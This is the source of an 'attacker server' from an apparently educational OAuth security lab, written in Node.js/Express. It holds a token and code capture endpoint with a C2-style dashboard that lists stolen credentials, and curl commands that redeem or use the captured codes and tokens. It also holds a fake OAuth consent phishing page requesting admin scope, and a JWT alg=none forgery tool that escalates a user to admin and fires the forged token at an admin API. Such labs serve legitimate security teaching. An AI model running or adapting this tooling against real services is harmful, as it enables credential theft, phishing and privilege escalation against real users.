/**
 * Attacker Server
 * ===============
 * Simulates the attacker's infrastructure used in OAuth attack scenarios.
 * For EDUCATIONAL purposes only — demonstrates what attacker endpoints look like.
 *
 * Components:
 *   /capture        — Receives stolen tokens (Attack 1, 3)
 *   /phishing       — Fake OAuth consent page (Attack 4: Consent Abuse)
 *   /evil-redirect  — Malicious redirect handler (Attack 1)
 *   /forge-jwt      — JWT forgery tool (Attack 7)
 */

const express = require('express');
const app = express();
const PORT = process.env.PORT || 3004;

// Public-facing URLs — override for deployment
const CLIENT_BASE_URL   = process.env.CLIENT_BASE_URL   || 'http://localhost:3002';
const AUTH_BASE_URL     = process.env.AUTH_SERVER_PUBLIC || 'http://localhost:3001';
const RESOURCE_BASE_URL = process.env.RESOURCE_SERVER_PUBLIC || 'http://localhost:3003';
const SELF_URL          = process.env.ATTACKER_BASE_URL  || `http://localhost:${PORT}`;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-memory log of captured tokens (for lab demonstration)
const capturedTokens = [];
const capturedCodes = [];

// ── Token/Code capture endpoint ───────────────────────────────────────────────
app.get('/capture', (req, res) => {
  const { code, token, state } = req.query;

  if (code) {
    capturedCodes.push({ code, state, timestamp: new Date().toISOString(), ip: req.ip });
    console.log(`\n🚨 ATTACKER: Authorization code captured! Code: ${code}`);
  }

  if (token) {
    capturedTokens.push({ token: token.substring(0, 80) + '...', full: token, timestamp: new Date().toISOString(), ip: req.ip });
    console.log(`\n🚨 ATTACKER: Access token captured via XSS! (truncated): ${token.substring(0, 50)}...`);
  }

  const curlExchange = code ? [
    `curl -X POST ${AUTH_BASE_URL}/oauth/token \\`,
    `  -d "grant_type=authorization_code" \\`,
    `  -d "code=${code}" \\`,
    `  -d "redirect_uri=${SELF_URL}/capture" \\`,
    `  -d "client_id=malicious-client" \\`,
    `  -d "client_secret=evil-secret-666"`
  ].join('\n') : '';

  const curlApi = token ? [
    `curl ${RESOURCE_BASE_URL}/api/profile \\`,
    `  -H "Authorization: Bearer ${token}"`
  ].join('\n') : '';

  // Build conditional HTML blocks BEFORE the template literal to avoid nested backtick escaping
  const codeHtml = code ? `
  <div class="capture-box">
    <h3>✅ Authorization Code — Attack 1 / Attack 2</h3>
    <p style="font-size:12px;color:#5c4a2a;margin-bottom:6px">Captured code:</p>
    <div class="val"><button class="copy-btn" onclick="copyText('${code.replace(/'/g,"\'")}',this)">Copy</button>${code}</div>
    <h3 style="margin-top:14px">Exchange for tokens:</h3>
    <pre class="cmd">${curlExchange}</pre>
    <div style="font-size:12px;color:#5c4a2a;margin-top:8px;padding:8px;background:#fff9e8;border-radius:4px;border:1.5px dashed #d4b896">
      🔴 <strong>VULNERABLE:</strong> Succeeds without code_verifier (PKCE bypass — Attack 2)<br>
      🟢 <strong>SECURE:</strong> Fails — PKCE verifier required, only the legitimate client holds it
    </div>
  </div>` : '';

  const tokenHtml = token ? `
  <div class="capture-box" style="margin-top:14px">
    <h3>✅ Access Token Stolen via XSS — Attack 3</h3>
    <p style="font-size:12px;color:#5c4a2a;margin-bottom:6px">Stolen token:</p>
    <div class="val"><button class="copy-btn" onclick="copyText('${token.replace(/'/g,"\'")}',this)">Copy</button>${token.substring(0,80)}…</div>
    <h3 style="margin-top:14px">Use against Resource API:</h3>
    <pre class="cmd">${curlApi}</pre>
  </div>` : '';

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>💀 Captured!</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Nunito',sans-serif;background:#fdf6e3;color:#2d2416;min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px)}
nav{background:#fffef7;border-bottom:2px solid #d4b896;padding:10px 20px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100;box-shadow:0 2px 0 #d4b896}
nav a{text-decoration:none;font-weight:800}
.card{background:#fffef7;border:2px solid #d4b896;border-radius:10px;padding:24px;max-width:720px;margin:40px auto 24px;box-shadow:4px 4px 0 #c4a070;position:relative;z-index:1}
h2{font-size:18px;font-weight:900;margin-bottom:12px;color:#2d2416}
h3{font-size:13px;font-weight:800;margin:16px 0 8px;color:#2d2416}
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:10px;font-size:10px;font-weight:800;border:2px solid;font-family:'Courier Prime',monospace;margin-bottom:14px}
.badge-red{background:rgba(224,90,58,.1);color:#e05a3a;border-color:#e05a3a}
.capture-box{background:rgba(224,90,58,.05);border:2px solid #e05a3a;border-radius:6px;padding:14px;margin-bottom:14px}
.capture-box h3{color:#e05a3a;margin-top:0}
.val{font-family:'Courier Prime',monospace;font-size:11.5px;background:#fff9e8;border:1.5px dashed #d4b896;border-radius:4px;padding:8px 10px;word-break:break-all;color:#3a6eb5;margin:6px 0;overflow:auto}
pre.cmd{font-family:'Courier Prime',monospace;font-size:11px;background:#fff9e8;border:1.5px dashed #d4b896;border-radius:4px;padding:10px 12px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;color:#2d2416;margin:8px 0;line-height:1.6}
.btn{padding:8px 16px;border-radius:5px;font-size:12px;font-weight:800;border:2px solid;font-family:'Nunito',sans-serif;text-decoration:none;display:inline-block;box-shadow:3px 3px 0 #c4a070;transition:all .12s;cursor:pointer;background:transparent;margin-right:8px;margin-top:12px}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 #c4a070}
.btn-red{color:#e05a3a;border-color:#e05a3a}
.btn-blue{color:#3a6eb5;border-color:#3a6eb5}
.copy-btn{padding:2px 8px;font-size:10px;font-weight:800;border:1.5px solid #d4b896;border-radius:3px;background:#fffef7;cursor:pointer;font-family:'Courier Prime',monospace;color:#5c4a2a;float:right;margin-left:6px;transition:all .1s}
.copy-btn:hover{border-color:#3a6eb5;color:#3a6eb5}
.copy-btn.ok{color:#3a9e6a;border-color:#3a9e6a}
</style>
<script>
function copyText(text,btn){navigator.clipboard.writeText(text).then(()=>{const o=btn.textContent;btn.textContent='✓';btn.classList.add('ok');setTimeout(()=>{btn.textContent=o;btn.classList.remove('ok')},1500)});}
</script>
</head>
<body>
<nav>
  <a href="${CLIENT_BASE_URL}" style="font-size:14px;color:#2d2416">🔐 OAuth Lab</a>
  <span style="flex:1;color:#9c8860;font-size:11px">·</span>
  <a href="/dashboard" style="font-size:11px;color:#e05a3a;border:1.5px solid #e05a3a;padding:2px 10px;border-radius:5px">💀 Dashboard</a>
  <a href="/phishing" style="font-size:11px;color:#5c4a2a;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">🎣 Phishing</a>
  <a href="/forge-jwt" style="font-size:11px;color:#5c4a2a;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">🔧 Forge JWT</a>
</nav>
<div class="card">
  <div class="badge badge-red">🚨 CAPTURE SUCCESS</div>
  <h2>💀 Attacker Server — Data Captured</h2>
  ${codeHtml}
  ${tokenHtml}
  <div>
    <a href="/dashboard" class="btn btn-red">📊 All Captured Data</a>
    <a href="${CLIENT_BASE_URL}/lab" class="btn btn-blue">📚 Back to Lab</a>
  </div>
</div>
</body>
</html>`);
});

// ── Attacker dashboard ────────────────────────────────────────────────────────
app.get('/dashboard', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>💀 Attacker C2</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Nunito',sans-serif;background:#fdf6e3;color:#2d2416;min-height:100vh;padding:20px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;
  background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px);}
.page{max-width:900px;margin:0 auto;position:relative;z-index:1}
.header{background:#fffef7;border:2px solid #d4b896;border-radius:8px;padding:20px 24px;margin-bottom:20px;box-shadow:3px 3px 0 #c4a070}
.header h1{font-size:22px;font-weight:900;color:#e05a3a;margin-bottom:4px}
.header p{font-size:13px;color:#5c4a2a}
.badge{display:inline-block;background:rgba(224,90,58,.12);color:#e05a3a;border:2px solid #e05a3a;
  padding:2px 8px;border-radius:10px;font-size:10px;font-weight:800;font-family:'Courier Prime',monospace;margin-left:8px}
.section{background:#fffef7;border:2px solid #d4b896;border-radius:8px;padding:18px 20px;margin-bottom:16px;box-shadow:3px 3px 0 #c4a070}
.section h2{font-size:14px;font-weight:800;color:#2d2416;margin-bottom:12px;padding-bottom:6px;border-bottom:2px dashed #d4b896}
.empty{color:#9c8860;font-size:13px;font-style:italic;padding:8px 0}
.entry{background:#f5f0e5;border:2px solid #d4b896;border-radius:6px;padding:10px 12px;margin-bottom:8px}
.entry:last-child{margin-bottom:0}
.entry-row{display:flex;align-items:flex-start;gap:10px}
.entry-code{font-family:'Courier Prime',monospace;font-size:12px;color:#3a6eb5;word-break:break-all;flex:1;line-height:1.5}
.copy-btn{flex-shrink:0;padding:3px 10px;background:#fffef7;border:2px solid #d4b896;border-radius:4px;
  font-size:10px;font-weight:800;cursor:pointer;font-family:'Courier Prime',monospace;color:#5c4a2a;
  transition:all .12s;white-space:nowrap}
.copy-btn:hover{border-color:#c4a070;background:#f5f0e5;transform:translateY(-1px);box-shadow:2px 2px 0 #c4a070}
.copy-btn.ok{background:rgba(58,158,106,.1);color:#3a9e6a;border-color:#3a9e6a}
.ts{font-size:10px;color:#9c8860;margin-top:4px;font-family:'Courier Prime',monospace}
.tools{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.tool-link{display:block;background:#fffef7;border:2px solid #d4b896;border-radius:6px;padding:10px 12px;
  text-decoration:none;color:#2d2416;font-weight:700;font-size:13px;
  transition:all .12s;box-shadow:2px 2px 0 #c4a070}
.tool-link:hover{border-color:#c4a070;transform:translate(-1px,-1px);box-shadow:3px 3px 0 #c4a070}
.refresh-btn{padding:4px 12px;background:#fffef7;border:2px solid #d4b896;border-radius:4px;
  font-size:11px;font-weight:800;cursor:pointer;font-family:'Courier Prime',monospace;color:#5c4a2a;
  box-shadow:2px 2px 0 #c4a070;transition:all .12s;float:right}
.refresh-btn:hover{transform:translate(-1px,-1px);box-shadow:3px 3px 0 #c4a070}
</style>
<script>
function copyText(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.textContent;
    btn.textContent = '✓ Copied'; btn.classList.add('ok');
    setTimeout(() => { btn.textContent = orig; btn.classList.remove('ok'); }, 1500);
  });
}
</script>
</head>
<body>
<div class="page">
  <div class="header">
    <h1>💀 Attacker C2 Dashboard<span class="badge">EDUCATIONAL ONLY</span></h1>
    <p>Simulates attacker infrastructure. Captured codes and tokens appear here automatically when attacks run.</p>
  </div>

  <div class="section">
    <h2>🔑 Captured Authorization Codes <span style="color:#e05a3a;font-family:Courier Prime,monospace">(${capturedCodes.length})</span>
      <button class="refresh-btn" onclick="location.reload()">↻ Refresh</button>
    </h2>
    ${capturedCodes.length === 0
      ? '<div class="empty">No codes captured yet. Run Attack 1 to capture a code.</div>'
      : [...capturedCodes].reverse().map(c => `
    <div class="entry">
      <div class="entry-row">
        <div class="entry-code">${c.code}</div>
        <button class="copy-btn" onclick="copyText('${c.code}', this)">Copy</button>
      </div>
      <div class="ts">${c.timestamp} · state: ${c.state || 'none'}</div>
    </div>`).join('')}
  </div>

  <div class="section">
    <h2>🎭 Captured Tokens via XSS <span style="color:#e05a3a;font-family:Courier Prime,monospace">(${capturedTokens.length})</span>
      <button class="refresh-btn" onclick="location.reload()">↻ Refresh</button>
    </h2>
    ${capturedTokens.length === 0
      ? '<div class="empty">No tokens captured yet. Run Attack 3 (XSS Leakage) to capture a token.</div>'
      : [...capturedTokens].reverse().map(t => `
    <div class="entry">
      <div class="entry-row">
        <div class="entry-code">${t.full || t.token}</div>
        <button class="copy-btn" onclick="copyText('${(t.full || t.token).replace(/'/g,"\\'")}', this)">Copy</button>
      </div>
      <div class="ts">${t.timestamp}</div>
    </div>`).join('')}
  </div>

  <div class="section">
    <h2>🛠 Attack Tools</h2>
    <div class="tools">
      <a class="tool-link" href="/phishing">🎣 Phishing Page<br><span style="font-size:11px;font-weight:400;color:#9c8860">Attack 4 — Consent Abuse</span></a>
      <a class="tool-link" href="/forge-jwt">🔧 JWT Forge Tool<br><span style="font-size:11px;font-weight:400;color:#9c8860">Attack 7 — alg=none</span></a>
      <a class="tool-link" href="/api/latest">📡 Latest Capture (JSON)<br><span style="font-size:11px;font-weight:400;color:#9c8860">Machine-readable endpoint</span></a>
    </div>
  </div>
</div>
</body>
</html>`);
});

// ── Phishing page: Fake OAuth consent (Attack 4) ──────────────────────────────
app.get('/phishing', (req, res) => {
  // Build the real malicious OAuth URL — clicking Allow will trigger a real OAuth flow
  const authUrl = `${AUTH_BASE_URL}/oauth/authorize?` +
    `response_type=code` +
    `&client_id=malicious-client` +
    `&redirect_uri=${encodeURIComponent(SELF_URL + '/capture')}` +
    `&scope=read+write+admin` +
    `&state=phishing-attack4`;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>🎣 OAuth Consent — Free Gift Cards</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Nunito',sans-serif;background:#fdf6e3;color:#2d2416;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px)}
.outer{max-width:460px;width:100%;position:relative;z-index:1}
.card{background:#fffef7;border:2px solid #d4b896;border-radius:12px;padding:28px;box-shadow:4px 4px 0 #c4a070}
.app-icon{font-size:44px;text-align:center;margin-bottom:8px}
.app-name{font-size:18px;font-weight:900;color:#2d2416;text-align:center}
.app-sub{font-size:12px;color:#9c8860;text-align:center;margin-bottom:18px;margin-top:4px}
.scope-list{list-style:none;padding:0;margin:0 0 16px;border:2px solid #d4b896;border-radius:6px;overflow:hidden}
.scope-item{padding:9px 13px;border-bottom:1.5px solid #d4b896;font-size:12.5px;display:flex;align-items:center;gap:8px}
.scope-item:last-child{border-bottom:none}
.scope-item.danger{background:rgba(224,90,58,.05);color:#e05a3a;font-weight:700}
.lab-note{background:rgba(212,133,42,.08);border:2px solid #d4852a;border-radius:6px;padding:10px 13px;margin-bottom:16px;font-size:11.5px;color:#5c4a2a;line-height:1.6}
.lab-note strong{color:#d4852a}
.btn{display:block;width:100%;padding:11px;border-radius:6px;font-size:14px;font-weight:800;cursor:pointer;text-decoration:none;text-align:center;border:2px solid;font-family:'Nunito',sans-serif;transition:all .12s;box-shadow:3px 3px 0 #c4a070;margin-bottom:8px}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 #c4a070}
.btn-allow{background:rgba(58,110,181,.1);color:#3a6eb5;border-color:#3a6eb5}
.btn-deny{background:#fdf6e3;color:#9c8860;border-color:#d4b896}
.edu-note{font-size:11px;color:#9c8860;text-align:center;margin-top:12px;font-family:'Courier Prime',monospace}
.edu-note a{color:#3a6eb5;font-weight:700}
</style>
</head>
<body>
<div class="outer">
  <div class="card">
    <div class="app-icon">🎁</div>
    <div class="app-name">Free Gift Cards App</div>
    <div class="app-sub">wants permission to access your account</div>
    <ul class="scope-list">
      <li class="scope-item">✓ Read your profile information</li>
      <li class="scope-item">✓ Access your email address</li>
      <li class="scope-item danger">⚠️ Full admin access to your account</li>
      <li class="scope-item danger">⚠️ Read and write all your data</li>
    </ul>
    <div class="lab-note">
      <strong>🧪 Lab Note — Attack 4 (OAuth Consent Abuse):</strong><br>
      Clicking Allow triggers a real OAuth flow using <code style="font-family:'Courier Prime',monospace;font-size:10px;background:#fff9e8;padding:1px 4px;border-radius:2px">malicious-client</code>. The authorization code lands on the Attacker dashboard. In a real attack this warning wouldn't exist.
    </div>
    <a href="${authUrl}" class="btn btn-allow">✅ Allow Access</a>
    <a href="${CLIENT_BASE_URL}" class="btn btn-deny">✖ Cancel</a>
    <div class="edu-note">After approving → <a href="/dashboard">Attacker Dashboard</a> shows the captured code</div>
  </div>
</div>
</body>
</html>`);
});

// ── JWT Forge Tool (Attack 7) ──────────────────────────────────────────────────
app.get('/forge-jwt', (req, res) => {
  const payload = {
    sub: 'alice',
    username: 'alice',
    email: 'alice@example.com',
    client_id: 'legitimate-client',
    scope: 'read write admin',     // Escalated!
    roles: ['user', 'admin'],      // Elevated!
    iss: AUTH_BASE_URL,
    aud: RESOURCE_BASE_URL,
    exp: Math.floor(Date.now() / 1000) + 3600,
    iat: Math.floor(Date.now() / 1000),
    jti: 'forged-token-id',
  };

  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const forgedToken = `${header}.${encodedPayload}.`; // Empty signature

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>🔧 JWT Forge Tool — Attack 7</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Nunito',sans-serif;background:#fdf6e3;color:#2d2416;min-height:100vh}
body::before{content:'';position:fixed;inset:0;pointer-events:none;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px)}
nav{background:#fffef7;border-bottom:2px solid #d4b896;padding:10px 20px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100;box-shadow:0 2px 0 #d4b896}
nav a{text-decoration:none;font-weight:800}
.card{background:#fffef7;border:2px solid #d4b896;border-radius:10px;padding:24px;max-width:760px;margin:40px auto 24px;box-shadow:4px 4px 0 #c4a070;position:relative;z-index:1}
h2{font-size:18px;font-weight:900;margin-bottom:12px}
h3{font-size:13px;font-weight:800;margin:16px 0 8px;color:#2d2416}
.badge{display:inline-flex;padding:3px 10px;border-radius:10px;font-size:10px;font-weight:800;border:2px solid #e05a3a;background:rgba(224,90,58,.1);color:#e05a3a;font-family:'Courier Prime',monospace;margin-bottom:14px}
.steps-box{background:rgba(212,133,42,.05);border:2px solid #d4852a;border-radius:6px;padding:14px;margin-bottom:16px}
.steps-box ol{padding-left:18px;font-size:12.5px;color:#5c4a2a;line-height:1.9}
.token-wrap{position:relative;margin:8px 0}
.token-area{width:100%;min-height:80px;background:#fff9e8;border:2px dashed #d4b896;border-radius:6px;padding:10px 12px;font-family:'Courier Prime',monospace;font-size:11px;color:#3a6eb5;resize:vertical;word-break:break-all;line-height:1.6;outline:none;cursor:text}
pre.payload{background:#fff9e8;border:2px dashed #d4b896;border-radius:6px;padding:12px;font-family:'Courier Prime',monospace;font-size:11.5px;color:#2d2416;overflow-x:auto;white-space:pre-wrap;word-break:break-word;line-height:1.6;margin:8px 0}
pre.cmd{background:#fff9e8;border:2px dashed #d4b896;border-radius:6px;padding:12px;font-family:'Courier Prime',monospace;font-size:11px;color:#2d2416;overflow-x:auto;white-space:pre-wrap;word-break:break-word;line-height:1.6;margin:8px 0}
.result-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
.res-box{padding:10px 13px;border-radius:5px;font-size:12px;font-weight:700;border:2px solid}
.res-vuln{background:rgba(224,90,58,.07);border-color:#e05a3a;color:#e05a3a}
.res-sec{background:rgba(58,158,106,.07);border-color:#3a9e6a;color:#3a9e6a}
.btn{padding:8px 16px;border-radius:5px;font-size:12px;font-weight:800;border:2px solid;font-family:'Nunito',sans-serif;text-decoration:none;display:inline-block;box-shadow:3px 3px 0 #c4a070;transition:all .12s;cursor:pointer;background:transparent;margin-right:8px;margin-top:14px}
.btn:hover{transform:translate(-1px,-1px);box-shadow:4px 4px 0 #c4a070}
.btn-red{color:#e05a3a;border-color:#e05a3a}
.btn-blue{color:#3a6eb5;border-color:#3a6eb5}
.copy-btn{padding:2px 9px;font-size:10px;font-weight:800;border:1.5px solid #d4b896;border-radius:3px;background:#fffef7;cursor:pointer;font-family:'Courier Prime',monospace;color:#5c4a2a;float:right;transition:all .1s}
.copy-btn:hover{border-color:#3a6eb5;color:#3a6eb5}
.copy-btn.ok{color:#3a9e6a;border-color:#3a9e6a}
</style>
<script>
function copyText(text,btn){navigator.clipboard.writeText(text).then(()=>{const o=btn.textContent;btn.textContent='✓ Copied';btn.classList.add('ok');setTimeout(()=>{btn.textContent=o;btn.classList.remove('ok')},1500)});}
</script>
</head>
<body>
<nav>
  <a href="${CLIENT_BASE_URL}" style="font-size:14px;color:#2d2416">🔐 OAuth Lab</a>
  <span style="flex:1;color:#9c8860;font-size:11px">·</span>
  <a href="/dashboard" style="font-size:11px;color:#e05a3a;border:1.5px solid #e05a3a;padding:2px 10px;border-radius:5px">💀 Dashboard</a>
  <a href="${CLIENT_BASE_URL}/lab" style="font-size:11px;color:#3a6eb5;border:1.5px solid #d4b896;padding:2px 10px;border-radius:5px">📚 Attack Lab</a>
</nav>
<div class="card">
  <div class="badge">⚔️ ATTACK 7 — JWT ALG:NONE</div>
  <h2>🔧 JWT Algorithm Confusion Forge Tool</h2>
  <div class="steps-box">
    <h3 style="margin-top:0;color:#d4852a">How alg=none works:</h3>
    <ol>
      <li>Get a legitimate JWT from the auth server (log in via Client App)</li>
      <li>Decode header + payload — both are just base64url, no secret needed</li>
      <li>Modify payload: escalate scope to <code style="font-family:'Courier Prime',monospace;font-size:10px;background:#fff9e8;padding:1px 4px;border-radius:2px">admin</code>, add <code style="font-family:'Courier Prime',monospace;font-size:10px;background:#fff9e8;padding:1px 4px;border-radius:2px">roles:["admin"]</code></li>
      <li>Change header <code style="font-family:'Courier Prime',monospace;font-size:10px;background:#fff9e8;padding:1px 4px;border-radius:2px">"alg":"none"</code> — tells server "no signature needed"</li>
      <li>Re-encode: <code style="font-family:'Courier Prime',monospace;font-size:10px;background:#fff9e8;padding:1px 4px;border-radius:2px">header.payload.</code> (empty signature, trailing dot)</li>
      <li>VULNERABLE server accepts it — no algorithm check; SECURE rejects it</li>
    </ol>
  </div>

  <h3>Forged Token (alg=none, admin-escalated):</h3>
  <div class="token-wrap">
    <button class="copy-btn" onclick="copyText(document.getElementById('tok').value,this)">Copy</button>
    <textarea id="tok" class="token-area" onclick="this.select()" readonly>${forgedToken}</textarea>
  </div>

  <h3>Injected Payload:</h3>
  <pre class="payload">${JSON.stringify(payload, null, 2)}</pre>

  <h3>Test curl command:</h3>
  <div class="token-wrap">
    <button class="copy-btn" onclick="copyText(document.getElementById('cmd').textContent,this)">Copy</button>
    <pre id="cmd" class="cmd">curl ${RESOURCE_BASE_URL}/api/admin/users \
  -H "Authorization: Bearer ${forgedToken}"</pre>
  </div>
  <div class="result-row" style="margin-bottom:14px">
    <div class="res-vuln">🔴 VULNERABLE → <strong>200 OK</strong> — full user list returned</div>
    <div class="res-sec">🟢 SECURE → <strong>401 Unauthorized</strong> — jwt.verify() rejects alg=none</div>
  </div>

  <button class="btn btn-red" id="runBtn" onclick="runForgedCurl()">▶ Run Against Resource API</button>

  <div id="curl-result" style="display:none;margin-top:12px;background:#fff9e8;border:2px dashed #d4b896;border-radius:6px;padding:12px">
    <div id="curl-status" style="font-size:11px;font-weight:800;font-family:'Courier Prime',monospace;margin-bottom:6px"></div>
    <pre id="curl-body" style="font-family:'Courier Prime',monospace;font-size:11px;white-space:pre-wrap;word-break:break-word;color:#2d2416;line-height:1.6;margin:0"></pre>
  </div>

  <script>
  async function runForgedCurl() {
    const btn = document.getElementById('runBtn');
    const resultDiv = document.getElementById('curl-result');
    const statusEl = document.getElementById('curl-status');
    const bodyEl = document.getElementById('curl-body');
    btn.textContent = '⏳ Running…'; btn.disabled = true;
    resultDiv.style.display = 'block';
    statusEl.style.color = '#9c8860';
    statusEl.textContent = 'Sending forged token to Resource API…';
    bodyEl.textContent = '';
    try {
      const resp = await fetch('${RESOURCE_BASE_URL}/api/admin/users', {
        headers: { 'Authorization': 'Bearer ${forgedToken}' }
      });
      const data = await resp.json();
      const ok = resp.status < 300;
      statusEl.style.color = ok ? '#e05a3a' : '#3a9e6a';
      statusEl.textContent = ok
        ? 'HTTP ' + resp.status + ' ⚠️  Attack succeeded! (VULNERABLE mode)'
        : 'HTTP ' + resp.status + ' ✅ Attack blocked! (SECURE mode)';
      bodyEl.textContent = JSON.stringify(data, null, 2);
    } catch(e) {
      statusEl.style.color = '#e05a3a';
      statusEl.textContent = 'Request failed: ' + e.message;
    }
    btn.textContent = '▶ Run Again'; btn.disabled = false;
  }
  </script>

  <div style="margin-top:4px">
    <a href="/dashboard" class="btn btn-red">📊 Dashboard</a>
    <a href="${CLIENT_BASE_URL}/lab" class="btn btn-blue">📚 Back to Lab</a>
  </div>
</div>
</body>
</html>`);
});

app.get('/health', (req, res) => res.json({ status: 'attacker-server-online' }));

// ── GET /api/latest — Returns latest captured code and token for portal auto-fill ──
app.get('/api/latest', (req, res) => {
  const latestCode = capturedCodes.length > 0 ? capturedCodes[capturedCodes.length - 1].code : null;
  const latestToken = capturedTokens.length > 0 ? capturedTokens[capturedTokens.length - 1].full : null;
  res.json({ code: latestCode, token: latestToken, totalCodes: capturedCodes.length, totalTokens: capturedTokens.length });
});

app.listen(PORT, () => {
  console.log(`\n💀 Attacker Server running on port ${PORT} (EDUCATIONAL USE ONLY)`);
});

// ── GET /evil-redirect — Redirects with a captured code (Attack 1 demo) ───
app.get('/evil-redirect', (req, res) => {
  const code = req.query.code || '';
  res.redirect(`/dashboard?highlight=${encodeURIComponent(code)}`);
});
